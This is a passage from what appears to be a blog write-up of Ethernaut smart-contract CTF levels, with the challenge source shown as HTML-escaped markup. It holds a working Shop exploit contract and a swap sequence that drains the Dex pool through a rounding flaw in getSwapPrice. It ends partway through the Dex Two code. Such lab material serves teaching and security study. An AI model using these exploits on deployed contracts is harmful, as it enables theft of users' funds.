&lt;p&gt;but we could re-call the shop contract to construct two diffenrent returns value. (since the isSold variable was set to be public, its easy to do that)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;chall&#x2F;Shop.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Shop levelInstance;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;addr) {
&lt;&#x2F;span&gt;&lt;span&gt;        levelInstance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Shop&lt;&#x2F;span&gt;&lt;span&gt;(addr);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Shop&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isSold&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        levelInstance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and I have to say that even the &lt;code&gt;staticcall&lt;&#x2F;code&gt; could not prevent this. staticcall prevents many bytecode instructions from being called, but even within the contract there is still state changing. Related challenges: MetaTrust CTF 2023: &lt;a href=&quot;https:&#x2F;&#x2F;ranwen.de&#x2F;posts&#x2F;2023-09-17-metatrust23&#x2F;#who&quot;&gt;Who(stage1)&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dex&quot;&gt;Dex&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Dex &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; token1;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; token2;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_token2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _token1;
&lt;&#x2F;span&gt;&lt;span&gt;    token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _token2;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;addLiquidity&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;token_address, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token_address).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;from, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require((from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; token2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span&gt;(from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; token1), &amp;quot;Invalid tokens&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; amount, &amp;quot;Not enough to swap&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; swapAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getSwapPrice&lt;&#x2F;span&gt;&lt;span&gt;(from, to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), swapAmount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, swapAmount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getSwapPrice&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;from, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    return((amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;spender, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableToken&lt;&#x2F;span&gt;&lt;span&gt;(token1).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableToken&lt;&#x2F;span&gt;&lt;span&gt;(token2).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;token, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;account) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableToken &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ERC20 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address private&lt;&#x2F;span&gt;&lt;span&gt; _dex;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;dexInstance, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;name, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;symbol, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(name, symbol) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, initialSupply);
&lt;&#x2F;span&gt;&lt;span&gt;        _dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; dexInstance;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;owner, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;spender, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; _dex, &amp;quot;InvalidApprover&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_approve&lt;&#x2F;span&gt;&lt;span&gt;(owner, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;logical vulnerability. The calculation logic of the function &lt;code&gt;getSwapPrice&lt;&#x2F;code&gt; allows us to get more tokens by converting between two tokens&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;let token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; await contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;let token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; await contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;await contract.approve(instance, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token1, token2, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token2, token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token1, token2, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token2, token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token1, token2, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(token2, token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;45&lt;&#x2F;span&gt;&lt;span&gt;); 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;await contract.balanceOf(token1, instance);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.balanceOf(token2, instance);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;dex-two&quot;&gt;Dex Two&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;DexTwo &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; token1;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; token2;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_token2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
